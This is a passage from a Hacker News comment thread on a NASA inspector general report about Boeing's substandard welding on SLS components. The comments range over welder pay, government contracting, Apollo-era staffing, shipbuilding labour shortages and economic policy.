when it does happen. reply practicemaths 3 hours agorootparentI do not understand the statement \"Everyone would benefit from competition\". How is that not an oxymoron? Surely those that do not win in a competition are losers. How is that a benefit to them? reply burnte 1 hour agorootparentFair competition drives out inefficient players, and generally can keep costs down for consumers. That's what it means, it doesn't literally mean every single person will profit, but competition makes for healthier markets than lack thereof. reply practicemaths 1 hour agorootparentSo, competition benefits consumers, which are a subset of society. Say that instead. reply AnimalMuppet 1 hour agorootparentprev\"Everyone\" meaning \"everyone as a whole\", not absolutely every individual. If there's more than one grocery store, I probably get better prices. (Or, negatively, if there's only one then I probably get worse prices.) And so with every other aspect of the economy. reply practicemaths 50 minutes agorootparentSo, if competition is supposed to fix other aspects of the economy, why is healthcare disproportionately high compared to other things? There are several hospitals around me. Endless amount of doctor offices. There are several health insurance companies I can choose from. There is competition. Yet, prices are not affordable for most. reply rdtsc 6 hours agoparentprev> So, what next? our organs? Not even kidding. There are villages around where I grew up, a good number of adults have one kidney only. Now if they manage to kidnap and kill a person, now they got two kidneys, a heart, a liver and other stuff. reply Rinzler89 5 hours agorootparent>There are villages around where I grew up, a good number of adults have one kidney only. Moldova? reply grugagag 5 hours agorootparentprevWhat country are you in? reply gcr 5 hours agorootparentprevWhoa cool how come? reply rmbyrro 4 hours agoparentprev> So, what next? our organs? Yep, they started with our eye balls. In exchange, we are getting \"relevant ads\". Also our frontal lobe. In exchange, we get depressive dopamine releases. reply electriclove 3 hours agoparentprevYou mention health care and education. Have you considered government’s role in this? https://kottke.org/19/02/cheap-tvs-and-exorbitant-education-... reply WarOnPrivacy 5 hours agoparentprev> What MBAs and Financists destroyed so far: You can add governance for as long as lobbyists have been writing law. You can add accountability for whenever MBAs and investors come in contact with news orgs. reply yunohn 6 hours agoparentprev> So, what next? our organs? I’m almost certain I’ve seen a study that tried to prove opening up the organ trade would help the economy and hinder the black market. reply klyrs 3 hours agorootparentI see your organ trade study and raise you a billion dollar VC to turn kidneys into penis enlargement powder, buying at a rate that prices out the majority of dialysis patients. reply boppo1 2 hours agorootparentYou have a study for this or are you just getting off on imagined scenarios? I agree VC is largely terrible, but being hyperbolic won't help us arrive at a better solution. reply micromacrofoot 6 hours agoparentprev> what next? our organs? already happening, look at the american food industry reply tazu 6 hours agoparentprevnext [6 more] [flagged] Aldipower 6 hours agorootparentIs this ironic? reply pc86 6 hours agorootparentThe problem is that the Venn diagram of a) people who say things like \"Financists\" unironically and speak of a cabal of people with \"usurary (sic) schemes\" designed to bankrupt entire civilizations and b) actual, legitimate anti-Semites looks like a blurry circle unless you're right up against it. It doesn't mean there aren't people in (a) who aren't anti-Semites and who have legitimate grievances. But they're virtually indistinguishable from the people shitposting (or worse let, legitimately posting) on /pol/. reply sgu999 5 hours agorootparent> The problem is that the Venn diagram of a) people who say things like \"Financists\" unironically and speak of a cabal of people with \"usurary (sic) schemes\" designed to bankrupt entire civilizations and b) actual, legitimate anti-Semites looks like a blurry circle unless you're right up against it. > It doesn't mean there aren't people in (a) who aren't anti-Semites and who have legitimate grievances. But they're virtually indistinguishable from the people shitposting (or worse let, legitimately posting) on /pol/. The problem is that the Venn diagram of a) people who collect vintage teaspoons and b) competitive yodelers looks like a blurry circle unless you're right up against it. It doesn't mean there aren't spoon enthusiasts who can't carry a tune, but they're virtually indistinguishable from the alpine warblers at international yodeling championships. I didn't see any reference to judaism in the original post, how you both end up there is just... weird. reply ImPostingOnHN 5 hours agorootparentprevWhat makes you think that? The rise of private equity is what immediately came to my mind here, religion never crossed it. I am not in favor of what private equity is doing to the country. The reply seems to assert that I am thus a self-hating jew, which was hurtful of them to say about me. If anything, connecting the private equity efforts described in GP, to semitism, is what is anti-semetic. Our private equity overlords hail from many religions and backgrounds, and their creed is greed. reply mrguyorama 1 hour agorootparentprevNo this is a HUGE miss on your part. Those people speak of \"a cabal of bankers\" or \"Globalists\". They also blame the people involved, not the ideas they are implementing. reply mananaysiempre 19 hours agoprev> During a visit to Michoud in 2023, for example, inspectors discovered that welding on a component of the SLS Core Stage 3 did not meet NASA standards. Per the report, unsatisfactory welding performed on a set of fuel tanks led directly to a seven-month delay in EUS completion. > “According to NASA officials, the welding issues arose due to Boeing’s inexperienced technicians and inadequate work order planning and supervision,” the OIG says. [...] Welders are highly qualified and well-paid craftsmen. Wouldn’t surprise me if they’d been hit particularly hard by management that doesn’t value tenured, expensive employees. reply noworld 7 hours agoparentRelated: https://www.realcleardefense.com/articles/2024/08/12/whats_b... The Navy’s ability to build lower-cost warships that can shoot down Houthi rebel missiles in the Red Sea depends in part on a 25-year-old laborer who previously made parts for garbage trucks. Lucas Andreini, a welder at Fincantieri Marinette Marine, in Marinette, Wisconsin, is among thousands of young workers who’ve received employer-sponsored training nationwide as shipyards struggle to hire and retain employees. The labor shortage is one of myriad challenges that have led to backlogs in ship production and maintenance at a time when the Navy faces expanding global threats. Combined with shifting defense priorities, last-minute design changes and cost overruns, it has put the U.S. behind China in the number of ships at its disposal — and the gap is widening. Navy shipbuilding is currently in “a terrible state” — the worst in a quarter century, says Eric Labs, a longtime naval analyst at the Congressional Budget Office. “I feel alarmed,” he said. “I don’t see a fast, easy way to get out of this problem. It’s taken us a long time to get into it.” reply gen220 6 hours agorootparentThere was an ad for Navy shipbuilding recently that did the rounds online, targeting gig workers [1]. The snake grows hungry, and slithers toward its tail. :) [1]: https://www.youtube.com/watch?v=F1IZC3t8NRc reply coliveira 7 hours agorootparentprevI think it is a great development, the US decided to export jobs to other countries to pay less its own workers, so it fits well that now it has no expertise to build its war machines. reply Workaccount2 5 hours agorootparentIt doesn't even have to be like that. People want comfy WFH service jobs and college is basically just becoming 13th-16th grade at this point. America is an advanced economy and the advanced work is where the money and comfy life is. No one did anything wrong, really the problem is that too many are doing everything right. The only real answers to this is either immigrants (who undercut local workers) or some kind of wage incentive rebalancing/redistribution (which pisses off service workers above the median income). reply boppo1 2 hours agorootparent>No one did anything wrong No, LIRP and ZIRP are totally responsible for fundamentally causing 'growth' businesses to be valued ridiculously higher than 'dividend' businesses. Basically any business that was \"profitably make stuff now\" had to compete with \"no profit now, but we'll for sure change the world in 20 years\" for capital and making the DCFV denominator's risk-free-rate term 0 tilted the table 90 degrees toward the latter. The reason comfy \"knowledge\" WFH jobs are so much more financially desireable than anything else is absolutely the fault of the FOMC. They killed price discovery. reply coliveira 1 hour agorootparent100% agree. No-profit high valuation businesses can easily borrow its way into existence, and profitable businesses in the real economy have to compete for the same pool of money. reply imtringued 1 hour agorootparentprevI don't know why so many people on HN get ZIRP wrong. The problem with ZIRP isn't the absolute level of interest. The problem is that the central bank thinks it can simulate negative interest through QE. The zero lower bound is ultimately a price guarantee by the government that it will offer an infinite quantity of bonds to the general public to prevent the interest rate from dipping negative. Any form of lower price control will cause an oversupply. In this case (mostly rich) people are oversupplying capital to the government instead of simply spending it. Since the money is concentrated in the hands of fewer and fewer people, their investment decisions are going to either be a random crap shot, since information is distributed in the economy and the people who have information to make informed purchasing decisions have no money, while the people with money have no idea what to do with it, or it will endlessly get cycled through more QE and government debt. In a hypothetical scenario with negative interest, wealth deconcentrates so that money goes to where it needs to be. reply mensetmanusman 7 hours agorootparentprevGovernment incentivized wall-st backed outsourcing of critical skill sets turned out to be a bad idea. reply notabee 4 hours agorootparentprevThis has been posted here a good bit before, but adding it in as relevant. https://www.propublica.org/article/how-navy-spent-billions-l... We've let everything go to rot for the sake of a giant financial ponzi scheme that we call the U.S. economy. reply underlipton 5 hours agorootparentprevEverything about this reeks to me. Why do we need to build so many warships? (To fight China? We're going to war with another nuclear power?) Why are we fighting Houthi rebels? But also, why isn't the government sponsoring this training? Why is it only thousands, and not hundreds of thousands or even millions of workers being trained? And when did the call go out that they were going to be offering training? (I never hear about these initiatives, or when I do, it's for a couple thousand people to get into a position that pays $18/hr starting. Might as well walk onto a warehouse job.) If this is so important, why did they close so many shipyards during realignment? Like, from every angle, it's ill-conceived. reply GolfPopper 4 hours agorootparent>Why do we need to build so many warships? Igitur quī desīderat pacem, præparet bellum (\"Therefore let him who desires peace prepare for war\").[1] While I think there's immense scope for debate over what constitutes appropriate preparation in this or any other context, I believe the core idea, that effective preparation for war can prevent it, has merit. (Though it should not be the only way a country works to prevent war!) And there are ancillary uses for militaries, such as the prevention of piracy mentioned elsewhere. 1.https://en.wikipedia.org/wiki/Si_vis_pacem,_para_bellum reply HideousKojima 5 hours agorootparentprev>Why are we fighting Houthi rebels? Because they're attacking commercial shipping heading to and from the Suez Canal? I mean it wlso pleases our Saudi allies but the shipping attacks are the main concern. reply sgnelson 17 hours agoparentprevIf you read the OIG report, it states: \"Michoud officials stated that it has been difficult to attract and retain a contractor workforce with aerospace manufacturing experience in part due to Michoud’s geographical location in New Orleans, Louisiana, and lower employee compensation relative to other aerospace competitors.\" reply wmf 15 hours agorootparentThe entire purpose of SLS is to create high-paying jobs and they just... didn't. Imagine having a blank check and cheaping out. Amazing. reply toomuchtodo 15 hours agorootparentIf you can get away with the share buybacks and other self enrichment, with no accountability mechanisms, this is a natural outcome based on who is in charge of these companies. But, if we were to have made these workers government employees to pay them the desired wages (and cut out the management and shareholder middlemen) as well as “pay, train, retrain”, we would have been laughed at as promoting government waste. Much harder to skim government wages as a for profit enterprise vs government contracts. Like a religion or a cult, you have to cut through the ideology; the ideas are parroted to control the narrative. https://www.seattletimes.com/opinion/the-rot-at-the-heart-of... https://www.businessinsider.com/boeing-disaster-american-bus... reply JumpCrisscross 14 hours agorootparent> if we were to have made these workers government employees The problem is monopoly. Spacefaring isn’t exactly the type of work that attracts the safe and secure job for life types. (Most folks I know at SpaceX would have chosen another career if the only option were a public job at public pay with public promotion limits.) reply tw04 6 hours agorootparent>The problem is monopoly. Spacefaring isn’t exactly the type of work that attracts the safe and secure job for life types. Sure, but we aren't talking about hiring astronauts (who ironically do tend to spend their entire career in government because it's the only place to get the thrills they want from fighter pilot to space). We're talking about quality professional welders. Stereotyping them into one bucket would be silly, but I think it's fair to assume there are a large number of welders who wouldn't mind a guaranteed, high paying job with a guaranteed retirement package. Extend that to like 90% of the jobs required to make a spaceship... reply pc86 6 hours agorootparentDo you make more welding for the USG than you do welding in the private sector? If so it might be the only government job in the country that beats the private sector in terms of pay. reply underlipton 5 hours agorootparentPeople say this so confidently, shortly before the layoff that keeps them out of the job for half-a-year (for the 3rd time). reply toomuchtodo 14 hours agorootparentprevWhile SpaceX has been successful and innovative, it certainly doesn’t keep folks around. Average tenure is ~3.6 years. Those folks are smart, and can always find work elsewhere. Are we optimizing for the individual? Or for an aerospace manufacturing and supply chain system that requires care and feeding over decades? A tale as old as time. reply JumpCrisscross 12 hours agorootparent> While SpaceX has been successful and innovative, it certainly doesn’t keep folks around. Average tenure is ~3.6 years What was it for the Apollo programme?(The entire programme was 11 years [1].) > Are we optimizing for the individual? Or for an aerospace manufacturing and supply chain system that requires care and feeding over decades? I’m not arguing against having more people at NASA. Simply against the claim that this is the evidenced issue. Unless the entire American space programme is a failure, private operators are not the root problem. [1] https://en.m.wikipedia.org/wiki/Apollo_program reply adrianN 6 hours agorootparentThe Apollo program doesn’t seem to be a good example of a space pipeline that is sustainable for a few decades at least. reply JumpCrisscross 5 hours agorootparent> Apollo program doesn’t seem to be a good example of a space pipeline that is sustainable for a few decades at least Correct. OP suggested the root of the problem is we haven't made \"these workers government employees.\" The Apollo programme had lots of government employees. Commercial interests clearly aren't at the root of the problem. reply echoangle 3 hours agorootparentIm pretty sure the government employees working on Apollo were mostly already there before the program or stayed there afterwards, so their tenure was probably much longer than 3.6 years. And a lot of work on Apollo was done by contractors (for example building basically all flight hardware as far as I know). reply chrisco255 11 hours agorootparentprevAs a private company how are you even getting those numbers? I'm certain they vary dramatically by specialty within SpaceX. reply cj 7 hours agorootparentI think LinkedIn exposes these stats on Company pages. Search company and click the Insights tab. Edit: Median tenure is 2.8 yrs according to LinkedIn. reply Jensson 7 hours agorootparentAverage tenure will always be low in a growing company, not due to people leaving but due to people joining. Can see here space X has more than doubled the number of people the past few years, that is enough to explain that \"low tenure\", its just due to people joining. https://uploads-ssl.webflow.com/62ac4aacc75a115ff9dcb9bc/639... reply edmundsauto 14 hours agorootparentprevWhat do you think has changed since the 1960s? There were high paying private industry union protected skilled jobs, but many people went to work for NASA. reply AnthonyMouse 13 hours agorootparentThe USSR had just beat the US to put the first man into space. The same USSR that was killing political dissidents en masse and building an arsenal of terrifying nuclear weapons. John F. Kennedy set out the ambitious goal of putting a man on the moon before the end of the decade, and then he was assassinated. People wanted to make that happen. So they did. There hasn't been a lot to inspire people to work for the government like that lately. reply somenameforme 9 hours agorootparentWhile this is how this story is regularly retold it's not quite accurate. Polling around the Moon program tells that while there was a large minority of people vehemently in support of it, the overall response was mixed, and NASA was generally seen as a good target to cut funding from. [1] I think there are lots of parallels between the Moon landings in the 60s and the idea of colonizing Mars today. In particular, most people don't think it's possible, and so they think it's a waste of money. The Apollo program only received majority approval once we landed on the Moon. People also tend to dramatically overestimate the cost of achieving great things in space. Polling suggested people thought the Moon missions were taking up about 22% of the budget. In modern times it's down to less than 0.5%, and that's with NASA blowing tens of billions of dollars of pork projects like the SLS. Overall support for the Moon program only began to steadily rise in the years after human spaceflight was defacto completely cancelled by Nixon, and people were able to coolly reflect on what a ridiculous and important achievement that was. [1] - https://www.space.com/10601-apollo-moon-program-public-suppo... reply AnthonyMouse 8 hours agorootparentAccording to your own link, the thing people don't like isn't space exploration, it's paying for it: > \"When you divorce it from the numbers and you ask people if they like NASA and spaceflight, people say yes,\" Launius told SPACE.com. \"75 to 80 percent are in favor.\" Because obviously; people don't like paying for anything. If you ask someone without a lot of surplus in their life whether they'd rather have the money themselves in tax cuts or benefits or they want to spend it on astronauts, they want food on their table. Especially when they're overestimating how much the space program costs. But the question was, did people want to work for NASA? And then you get to select your idealists from the >75% in favor of the space program. reply JumpCrisscross 12 hours agorootparentprev> same USSR that was killing political dissidents en masse and building an arsenal of terrifying nuclear weapons One more factor: decolonisation created new countries. That created a unique competition for ideological supremacy. reply underlipton 5 hours agorootparentprevNo, it just aligned with elite interests (\"If they can put nuke platforms above our heads and we can't put some above theirs, it doesn't matter how much better our economy runs, in theory.\") There were plenty of people who would have loved to have put their energy and expertise towards a climate change moonshot, but our incredibly powerful corporate interests and the legislators that they own didn't want it to happen, so it didn't. Also, you remove that second S and first R from that second sentence, and it would still be true. Our entry into the space race wasn't a matter of unmatched moral nobility. reply thriftwy 11 hours agorootparentprev> killing political dissidents That's a funny perspective. USSR just before that time mostly killed communist apparatus members¥ and with them innocent people. In such an environment, there naturally won't be too many dissidents, so I don't think they registered. They did kill a lot of supposed sympathiers of pre-Soviet Russia, though. ¥ As they say, internal competition is the most fierce one. reply keiferski 7 hours agorootparentAre you forgetting that the USSR took control of about a dozen other countries during and after the war? That led to events like Katyn, which had nothing to do with communist dissidents. https://en.wikipedia.org/wiki/Katyn_massacre reply shiroiushi 12 hours agorootparentprevI think we're talking about highly-skilled precision welders who built things like the F-1 rocket engine. These people didn't work for NASA in the 1960s: they worked for private contractors like Rocketdyne. NASA doesn't build rocket engines, and never has. reply JumpCrisscross 13 hours agorootparentprev> What do you think has changed since the 1960s? There were high paying private industry union protected skilled jobs, but many people went to work for NASA We were spending more money. There was competition among contractors. And there were skilled low-level labourers from WWII. reply chrisco255 11 hours agorootparentprevThe Apollo project was the most ambitious engineering effort since the Manhattan project. What was next though? We didn't establish a moon base and instead opted for the Space Shuttle program which was considerably less ambitious than Apollo/Saturn V. reply panta 12 hours agorootparentprevCorporate culture changed radically in the 70s adopting Milton Friedman views that ethics and responsibility towards society have no place in the private sector, and as a consequence started maximizing profits in spite of everything else. reply timthorn 11 hours agorootparentI'm not convinced that's exactly what he thought, though corporates might have gone that way. reply chrisco255 11 hours agorootparentprevCorporations never had \"responsibility towards society\". In fact I much prefer corporations that don't pretend to have such a burden. It's almost always a false front. Corps have a responsibility to deliver a product or service at a competitive price in order to sustain growth. Friedman was an economist, not a corporate whisperer. To the extent that corps changed, they were forced to by market forces, most notably globalization, a force much bigger than one man and a force that was inevitable and even necessary in the wake of world war one and world war two. reply panta 4 hours agorootparentMaybe, but somehow their behaviour and their products and services changed. Companies are made of people, and individuals had more freedom to put value in what they did, they took pride in the quality of their work. After Friedman everything got \"optimized\" for revenue, even if this meant screwing the customers (or the society). There are some things that cannot possibly work with this \"self-regulated\" market, so if we want to accept this way of doing business, we should move back some responsibilities to the public sector (healthcare, infrastructures, rehabilitation, education, research), because the search for \"immediate gratification\" of shareholders can't move the society as a whole out of local maxima that are far away from society best possibilities. reply lupusreal 10 hours agorootparentprevNASA has piss all experience hiring and keeping the best fabricators, the government uses contractors to build things. The problem is with this contractor being rotten and NASA not being willing to kick them to the curb. reply ipaddr 14 hours agorootparentprevWhy would the qualified people who desire to work in that location and have better options suddenly work for the government. If the idea is to train non-experienced people that's what Boeing did. What is going to prevent them for leaving for other local work that pays better once they have some experience. What the government should have done is reduce their pay for missing deadlines by having milestones in the contract. At that point paying more makes economic sense and wages would rise. reply toomuchtodo 14 hours agorootparentBecause government jobs are secure, Boeing subcontractor jobs where you are a cheap disposal cog are not. If you don’t see the value in security to someone making $20-$40/hr who needs healthcare benefits, you might start there. A union fixes this in the long term, but that will take time. Government can employ rapidly. Something, quickly, needs to change before we forget how to build because MBAs, accountants, and lawyers burned the place down for shareholder value. There are two astronauts stuck in space very publicly demonstrating this. reply coliveira 7 hours agorootparentThe US has already forgotten how to build. This process has happened for 30 years, a full generation. reply ipaddr 13 hours agorootparentprevA welder making double outside of the government would take a chance the more experience they have. Similiar to how many people here would rather get a job at Amazon vs the government. Chances are you are out in a year or two compared to a government job where you can survive longer for half of the pay. Remember we are talking about experienced aircraft welders. They are not available for 20 an hour when industry is paying so much more. reply toomuchtodo 13 hours agorootparentCollins Aerospace is offering $19/hr for third shift welding work on aircraft. It was referred to me by someone in the labor community, and I spoke with HR under the guise of a prospective candidate to confirm. They do $26B/year in revenue. reply lifeisstillgood 12 hours agorootparentThis should be a top level comment - it kind of reinforces the point of the whole article. I understand that 15/hr is the (planned) US minimum wage? reply notabee 4 hours agorootparentPeople have been talking about raising the minimum wage to $15 for so long now (the \"Fight for 15\" movement started in 2012) that the inflation-adjusted value of that would now have to be almost $21/hr. However, the minimum wage is still $7.25 and seems to be likely to remain so. reply mrguyorama 1 hour agorootparentprevThe federal minimum wage has zero chance of increasing unless we get a supermajority of Democrats in both wings of congress and the presidency. Republicans, voters included, largely do not want the minimum wage to go up. reply bratwurst3000 9 hours agorootparentprevexcuse me but what is third shift welding? is this the security lvl of the welding job?thank you reply CDRdude 7 hours agorootparentThird shift is the overnight shift at a 24-hour workplace. Usually that means midnight to 8 AM. reply dopidopHN 9 hours agorootparentprevI live in New Orleans. It’s 1h away of commute. They pay a solid 30% below market. ( 100k for a senior eng position ) reply terribleperson 6 hours agorootparentAt 30% below market, I imagine most of their applicants are either true believers, fuck-ups, or lying about their experience. Probably mostly fuck-ups. reply numbsafari 6 hours agorootparentFuckups lying about their experience who truly believe they can get away with it. The tri-fuckta. reply whimsicalism 16 hours agorootparentprevThere is a reason that major contractors for government have widely distributed facilities in politically relevant states. reply BurningFrog 15 hours agorootparentIdeally there should be one facility in all 435 districts. This isn't ideal for optimizing quality work. reply klabb3 10 hours agorootparentprev> it has been difficult to attract and retain a contractor workforce […] in part due to […] lower employee compensation relative to other aerospace competitors You’re building rockets and complaining about the cost of skilled labor? reply armada651 5 hours agorootparentI always found the obsession with location-determined compensation weird. Experienced workers know exactly what their skills are worth regardless of the local labor market, so why even try surpressing their wages? Besides when you're an aerospace company producing rockets for NASA you are not building a product that the local market pays for, so why should your workers be affected by what the local market is willing to pay for their skills? How can the local labor market accurately value their skills if the product of their labor isn't sold in the same market? reply pants2 2 hours agorootparentBecause with non-remote work like welders you're competing with the local market for welders. Of course if they're paying 30% below market that means they're not properly doing location-based compensation. It's also a plain idiotic move because you'll end up with workers who cost 70% as much and are half as productive, at best, or at worst workers who cost 10,000% more because they screw up a critical component and cause massive delays. reply eddiewithzato 16 hours agorootparentprevaka they aren’t willing to pay, many such cases. reply Terr_ 15 hours agorootparentTheir wages are fine, there is simply a shortage of labor which is everybody's problem and needs government intervention in the form of tax dollars or something. /s reply Mistletoe 15 hours agorootparentprevNew Orleans is one of the greatest cities in the world and definitely has access to experienced welders, this argument makes no sense to me. reply inetknght 15 hours agorootparent> this argument makes no sense to me Might want to remember that experienced welders demand stronger compensation. Can't have that compensation going to the wrong people, though. Boeing can't survive as a business if it had to compensate fairly! reply Nicholas_C 15 hours agorootparentprevThere have to be a lot of welders in that region due to the oil and gas and heavy industry. If there aren't enough welders there I don't know what area would have enough. As others have said, maybe they're not paying them enough? reply _moof 15 hours agorootparentprevNot only that but Stennis Space Center is nearby. It's no Cape Canaveral but it's not as though aerospace is completely unheard of there. reply selimthegrim 6 hours agorootparentStennis is not getting its personnel from local grad schools. reply _moof 3 hours agorootparentWelders don't go to grad school so I'm not sure what we're talking about here. reply selimthegrim 3 hours agorootparentStennis isn’t going to keep welders around. Those are the design and engineering support personnel. reply selimthegrim 15 hours agorootparentprevUNO’s enrollment has dropped by 2/3rds since Katrina. What did people think was going to happen to the labor supply? reply selimthegrim 16 hours agorootparentprevHow did they build LIGO then? Fairy dust? reply emchammer 19 hours agoparentprevYou must have seen how beautiful the welds are on the Rocketdyne F-1 joints. Whoever made those put pride in their work. reply dandellion 18 hours agorootparentIf anyone else is curious this article has close-up photos of the joints: https://arstechnica.com/science/2013/04/how-nasa-brought-the... reply GVRV 11 hours agorootparentCan someone please explain why this is a high quality welding job? In India, welders are not paid handsomely and are rarely rigorously trained but I'm unable to distinguish between a welding job done by them compared to these photos. reply michaelt 8 hours agorootparentThe photos don't do a great job of showing it, and a lot of the skills in welding aren't immediately visible. Welding joints that look good as-welded, instead of passing over it with a grinder and a coat of paint to cover up any imperfections? That needs decent skills. Welding thin material, and not having the heat of the welding process just melt a hole right through? That's needs skill. Welding thin material to thick material, where it's easy to blow a hole in the thin part before the thick part gets up to temperature? That needs skill. Welding complex shapes where some of the work has to be done upside-down and you have to control what's going to happen to that molten metal under gravity? That's a special skill. Doing continuous welds around complex shapes, where you have to keep the weld puddle in the right place and moving at a constant rate while completely repositioning your body and moving your feet? That's a special skill. Because of thermal expansion/contraction, to get precision results you don't just put the parts in the desired location and weld them - you need special 'fixturing' that anticipates the inevitable change of shape due to the heat of welding. That's a special skill. Welding joints where, to prevent contamination, you need to get shielding gas not only at the front of the joint but also at the back? That's a special skill. Welding unusual metals, like special high temperature rocket nozzles might involve? That's a special skill. And most importantly, if you're welding a part that takes 40 hours of welding and 39 hours in you slip on the pedal and ruin the part, you've lost loads of work. So a part that needs 40 hours of welding requires exceptional consistency too. Of course none of this stuff is impossible. But for sure it's skilled work, and not easy to hire for. reply bratwurst3000 9 hours agorootparentprevdidnt read the article but I am assuming it is the material they are working on. copper and iron are easy to handle but aluminum is a bit harder and then there is stuff like titanium which recuire very high skills… and all those cases with titanium with steel or whatever. they need to know what they are doing. …. got my information from my ex roommate who welded bikes with titanium and he was a highly skilled enthusiast. https://www.cwbgroup.org/association/how-it-works/how-it-wor... reply lowdownbutter 8 hours agorootparentOh just like Skyrim smithing. reply typeofhuman 16 hours agorootparentprevMVP, thank you. reply jprete 18 hours agorootparentprevI guess they felt, correctly, that they were not just making a weld, not just making an engine or a rocket, but helping to put people on the moon. \"Building a cathedral\", indeed. reply starspangled 16 hours agorootparentMuch more than that though, they would have been highly skilled people with thousands of hours of welding high pressure piping and exotic metals. It doesn't matter how slowly or carefully somebody goes, or how much they revere what they are working on, if they aren't experienced then they will turn out poor work. reply mohaine 18 hours agorootparentprevA welding book I had mentioned that stick welding aluminum is no longer done because it is too hard and used the F-1 stick welds as an example of such welds. I think they we not so much welds as strategic strengthening. reply genter 16 hours agorootparentI'm surprised they stick welded it. I know they oxy-acetylene welded aluminum aircraft in WW2, (which I've attempted, I found it impossible to do) and TIG welding has existed since the 50s. reply ikekkdcjkfke 19 hours agoparentprevHaving NASA come and test stuff.. Creates a 'see what sticks' kind of attitude. Eat your own dogfood reply pjscott 18 hours agorootparentThe obvious patch for this is to have monetary penalties for failing inspection written into the contract, so that submitting shoddy work has a price measured in dollars. Money is the unit of caring, at least at a corporate scale, so there needs to be money involved if you want them to care systematically. (I don’t know if NASA already does this. They might.) reply sgnelson 16 hours agorootparentOne of the very interesting parts of the report is that the OIG recommended 4 areas that needed to be fixed/worked on. NASA agreed to 3 of them, and was working on making those areas better. The one recommendation that NASA did not agree with was to monetarily penalize Boeing for continuous quality issues. I found that interesting. reply wonderwonder 15 hours agorootparentRegulatory capture reply nradov 16 hours agorootparentprevInspections can help to an extent, but you can't inspect quality into a product. The customer can't anticipate every possible serious failure. Good results in safety-critical systems require an organizational culture that focuses on quality throughout the product lifecycle. reply jajko 10 hours agorootparentYeah but as we see with Boeing now, when its shitshow, its more like crap is landing left and right and not a situation of overall excellence with one singular failing point. Meaning many failures would be spotted. Maybe not 100% automatically corrected but much better situation than current regulatory capture one and stuff we see in news every second week. reply zo1 19 hours agoparentprevnext [26 more] [flagged] DSMan195276 18 hours agorootparentThe problem is that you can't run a large engineering department based on \"Bob says Steve isn't that good\". It just doesn't scale, that's the whole reason metrics get introduced. reply whatshisface 18 hours agorootparentYou can if you know both Bob and Steve because you are their manager... reply JumpCrisscross 13 hours agorootparent> You can if you know both Bob and Steve because you are their manager Apollo involved almost half a million people. You cannot manage that on gut feel. reply BobbyJo 18 hours agorootparentprevExactly. Who's to say Bob knows what he's talking about? reply ethbr1 17 hours agorootparentThere's a great scene at the end of Generation Kill where the war reporter asks the commander why he didn't reprimand one of the worst leaders underneath him more harshly. The commander essentially says that he constantly receives conflicting reports about his leaders' performance, and if he relieved one for unproven reports, his command would disintegrate. Because the good leaders have equal numbers of bad reports about them, from those who don't like them. Summed up the proper exercise of authority nicely, imho. reply andrewflnr 16 hours agorootparentThis is why the real answer is that the manager needs to know how to weld too, so they can independently validate Bob's and Steve's work. reply ethbr1 15 hours agorootparentThat's one answer. Although manager technical expertise has to also come with minimal ego, so you can defer to your people when they know more than you. The alternative is developing an intuition for bullshit. It's rarer, but I've had a few non-technical PMs / managers who were excellent at their job because they could suss out whether someone wasn't being honest. reply andrewflnr 15 hours agorootparentEverything has to come with minimal ego. I don't see how that has anything to do with managers having technical knowledge. And it's great if a handful of people can smell out bs in a field they're not familiar with, but you can't write policy on the back of a few unicorns like that. (Yes, managing ego is hard too, but I believe it's more common to start with and more trainable.) reply DSMan195276 18 hours agorootparentprevThe plot twist is that Bob is rushing all of his welds and thinks Steve is wasting his time by making them \"look good\". reply Yeul 17 hours agorootparentThere is this scene in Das Boot were one of the crew members says that they are going deeper than the sub is rated for and the captain says \"don't worry German engineering\". reply nradov 16 hours agorootparentGerman engineering like in the new Berlin airport? Or perhaps the new F125 frigates? https://www.dw.com/en/berlins-new-airport-finally-opens-a-st... https://www.reuters.com/article/world/late-and-overweight-ge... reply mangamadaiyan 17 hours agorootparentprevYeah, for all you know Bob could be one of those \"weld quickly and break things\" people. reply zo1 12 hours agorootparentBut right now we know neither (Bob or Steve being bad), and we hide that behind some objective metric that gets diluted at every level. We hide it in Steve's reviews, in Bob's reviews, in the post-weld reports, in the weld-quality audit report, the inspection. Heck even NASA oversight inspectors are probably downplaying some of the severity when stating it in their findings report (saying it's partially due to, or the welds \"contributed\" to the quality, etc.) instead of just saying \"these guys got an amateur to weld the exterior\". So this \"Steve is Bad\" property gets spread out across all those various things, when we could just as easily have fired Steve because Bob evaluated him. Or maybe Bob didn't state it, maybe the NASA inspector told him \"Bob, whoever you got to weld this thing is an amateur. Fire him before you get someone killed.\" And sure, does that mean Bob might get it wrong? Of course, he might even be a petty little tyrant with an ego or he just might not like Steve because he made a funny comment about Bob's tie on his first day. I don't think some things can scale and be optimized away like we're all a bunch of cogs in a machine with our own individual little tasks and performance metrics that get aggregated into the larger whole. reply zo1 12 hours agorootparentprevFair point - but we've seen how metrics can be gamed and cease to be useful measures of reality. People are smart and they will game them, even if it means hiding it behind a score/checklist/report. We can either choose excellence and competence, or we get this weird mediocrity that is killing us slowly but somehow we can say \"but it's running our large department based on science and scalable metrics\". Maybe we're not supposed to make these departments scale, maybe we need to keep them small and autonomous and \"unfair\" to some degree in order to function. Have we considered that? Not everything has to be optimized to the N-th degree and made to grow large like an instagram or google. reply MR4D 19 hours agorootparentprevThat’s a Mike-drop type comment. Agreed 100%. reply andrewflnr 16 hours agorootparentWhat's this about Mike, did someone give a bad report about his welds too? reply whatshisface 19 hours agorootparentprevGood luck fighting it. The basic human desire to stay out of the line of fire, combined with feudal loyalty trees, lead to the collapse of the Soviet Union despite the great intelligence and administrative ability of the people at the top. The only economic difference between the state monopoly of the USSR and the many companies of the US is that here, it's legal to start new organizations, where in the USSR that would be prosecuted as anti-party activity. The \"I have a family to feed\" effect worked exactly the same way over there. Reading about the history of socialism is eye-opening, specifically the period where it turned into a giant bureaucratic corporation that nobody was allowed to leave. That period started even before the mass murder toned down into \"repression,\" so strong was the desire of individual managers to make it impossible to blame them for shortfalls relative to unrealizable plans. For all that's been said about how different the east and west are, their fatal economic problems were nothing more alien than politics plus monopoly. reply schmidtleonard 17 hours agorootparentPrivate ownership isn't anti-monopoly, though. Big fuck-off monopolies are the best way to deliver rents to shareholders, which is capitalism's objective function, so ownership and management pursue the goal with a single mind and eventually they succeed. Eventually they find a combination of vertical/horizontal integration, economies of scale, network effects, platform effects, last mile dynamics, regulatory capture, and ownership rights that lock out competition. It's all they talk about, it's all they think about, and if you try to deliver a pitch to an investor without some kind of plan to build an anticompetitive moat god help you, lol. I'll believe that capitalists believe in competition when they start passing policy that promotes it. Policy that tax disadvantages large corporations to encourage them to break up. Policy that winds down the 